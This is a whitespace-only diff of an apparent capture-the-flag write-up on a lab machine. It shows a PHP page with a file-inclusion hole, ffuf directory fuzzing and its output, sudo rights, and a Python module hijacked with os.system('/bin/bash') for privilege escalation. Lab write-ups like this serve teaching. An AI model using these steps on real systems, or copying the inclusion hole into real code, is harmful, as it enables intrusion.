@@ -9,9 +9,9 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 21   | FTP     |
-| 22   | SSH     |
-| 80   | HTTP    |
+| 21 | FTP |
+| 22 | SSH |
+| 80 | HTTP |
 
 
 
@@ -81,66 +81,66 @@ Let's try to read `post.php` source code to find how this works:
 ```html 
 <!doctype html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="">
-    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
-    <meta name="generator" content="Jekyll v4.1.1">
-    <title>Corkplacemats</title>
+ <head>
+ <meta charset="utf-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+ <meta name="description" content="">
+ <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
+ <meta name="generator" content="Jekyll v4.1.1">
+ <title>Corkplacemats</title>
 
-    <link rel="canonical" href="https://getbootstrap.com/docs/4.5/examples/album/">
+ <link rel="canonical" href="https://getbootstrap.com/docs/4.5/examples/album/">
 
 <link href="css/bootstrap.min.css" rel="stylesheet">
 
-    <style>
-      .bd-placeholder-img {
-        font-size: 1.125rem;
-        text-anchor: middle;
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-      }
+ <style>
+ .bd-placeholder-img {
+ font-size: 1.125rem;
+ text-anchor: middle;
+ -webkit-user-select: none;
+ -moz-user-select: none;
+ -ms-user-select: none;
+ user-select: none;
+ }
 
-      @media (min-width: 768px) {
-        .bd-placeholder-img-lg {
-          font-size: 3.5rem;
-        }
-      }
-    </style>
-    <!-- Custom styles for this template -->
-    <link href="album.css" rel="stylesheet">
-  </head>
-  <body>
-    <header>
-  <div class="collapse bg-dark" id="navbarHeader">
-    <div class="container">
-      <div class="row">
-        <div class="col-sm-8 col-md-7 py-4">
-          <h4 class="text-white">About</h4>
-        </div>
-        <div class="col-sm-4 offset-md-1 py-4">
-          <h4 class="text-white">Contact</h4>
-          <ul class="list-unstyled">
-            <li><a href="#" class="text-white">Follow on Twitter</a></li>
-            <li><a href="#" class="text-white">Like on Facebook</a></li>
-            <li><a href="#" class="text-white">Email me</a></li>
-          </ul>
-        </div>
-      </div>
-    </div>
-  </div>
-  <div class="navbar navbar-dark bg-dark shadow-sm">
-    <div class="container d-flex justify-content-between">
-      <a href="/" class="navbar-brand d-flex align-items-center">
-        <strong>Corkplacemats</strong>
-      </a>
-      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarHeader" aria-controls="navbarHeader" aria-expanded="false" aria-label="Toggle navigation">
-        <span class="navbar-toggler-icon"></span>
-      </button>
-    </div>
-  </div>
+ @media (min-width: 768px) {
+ .bd-placeholder-img-lg {
+ font-size: 3.5rem;
+ }
+ }
+ </style>
+ <!-- Custom styles for this template -->
+ <link href="album.css" rel="stylesheet">
+ </head>
+ <body>
+ <header>
+ <div class="collapse bg-dark" id="navbarHeader">
+ <div class="container">
+ <div class="row">
+ <div class="col-sm-8 col-md-7 py-4">
+ <h4 class="text-white">About</h4>
+ </div>
+ <div class="col-sm-4 offset-md-1 py-4">
+ <h4 class="text-white">Contact</h4>
+ <ul class="list-unstyled">
+ <li><a href="#" class="text-white">Follow on Twitter</a></li>
+ <li><a href="#" class="text-white">Like on Facebook</a></li>
+ <li><a href="#" class="text-white">Email me</a></li>
+ </ul>
+ </div>
+ </div>
+ </div>
+ </div>
+ <div class="navbar navbar-dark bg-dark shadow-sm">
+ <div class="container d-flex justify-content-between">
+ <a href="/" class="navbar-brand d-flex align-items-center">
+ <strong>Corkplacemats</strong>
+ </a>
+ <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarHeader" aria-controls="navbarHeader" aria-expanded="false" aria-label="Toggle navigation">
+ <span class="navbar-toggler-icon"></span>
+ </button>
+ </div>
+ </div>
 </header>
 
 <main role="main">
@@ -148,19 +148,19 @@ Let's try to read `post.php` source code to find how this works:
 <div class="row">
  <div class="col-2"></div>
  <div class="col-8">
-  <?php include $_GET["post"]; ?>
+ <?php include $_GET["post"]; ?>
  </div>
 </div>
 
 </main>
 
 <footer class="text-muted">
-  <div class="container">
-    <p class="float-right">
-      <a href="#">Back to top</a>
-    </p>
-    <p>&copy; Corkplacemats 2020</p>
-  </div>
+ <div class="container">
+ <p class="float-right">
+ <a href="#">Back to top</a>
+ </p>
+ <p>&copy; Corkplacemats 2020</p>
+ </div>
 </footer>
 </html>
 
@@ -172,7 +172,7 @@ Vulnerability occurs in this line:
 
 ```
  <div class="col-8">
-  <?php include $_GET["post"]; ?>
+ <?php include $_GET["post"]; ?>
  </div>
 ```
 
@@ -185,35 +185,35 @@ If we fuzz, we can find some files, such as the `robots.txt` file, which entranc
 ```
 ffuf -w /usr/share/dirb/wordlists/common.txt:FUZZ -u "http://10.10.70.165/FUZZ" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.70.165/FUZZ
- :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Method : GET
+ :: URL : http://10.10.70.165/FUZZ
+ :: Wordlist : FUZZ: /usr/share/dirb/wordlists/common.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-                        [Status: 200, Size: 4826, Words: 1154, Lines: 135, Duration: 160ms]
-.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 165ms]
-.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 166ms]
-.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 164ms]
-css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 165ms]
-images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 160ms]
-index.php               [Status: 200, Size: 4826, Words: 1154, Lines: 135, Duration: 162ms]
-robots.txt              [Status: 200, Size: 69, Words: 4, Lines: 4, Duration: 159ms]
-server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 158ms]
+ [Status: 200, Size: 4826, Words: 1154, Lines: 135, Duration: 160ms]
+.hta [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 165ms]
+.htaccess [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 166ms]
+.htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 164ms]
+css [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 165ms]
+images [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 160ms]
+index.php [Status: 200, Size: 4826, Words: 1154, Lines: 135, Duration: 162ms]
+robots.txt [Status: 200, Size: 69, Words: 4, Lines: 4, Duration: 159ms]
+server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 158ms]
 ```
 
 Let's start the exploitation phase.
@@ -351,7 +351,7 @@ SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 # m h dom mon dow user	command
-17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+17 *	* * *	root cd / && run-parts --report /etc/cron.hourly
 25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
 47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
@@ -410,11 +410,11 @@ Let's check our sudo privileges:
 ```
 mat@watcher:~$ sudo -l
 Matching Defaults entries for mat on watcher:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+ env_reset, mail_badpass,
+ secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User mat may run the following commands on watcher:
-    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
+ (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
 ```
 
 We can check the folder and will notice this:
@@ -458,12 +458,12 @@ import os
 os.system('/bin/bash')
 
 def get_command(num):
-        if(num == "1"):
-                return "ls -lah"
-        if(num == "2"):
-                return "id"
-        if(num == "3"):
-                return "cat /etc/passwd"
+ if(num == "1"):
+ return "ls -lah"
+ if(num == "2"):
+ return "id"
+ if(num == "3"):
+ return "cat /etc/passwd"
 ```
 
 Now, let's run the script:
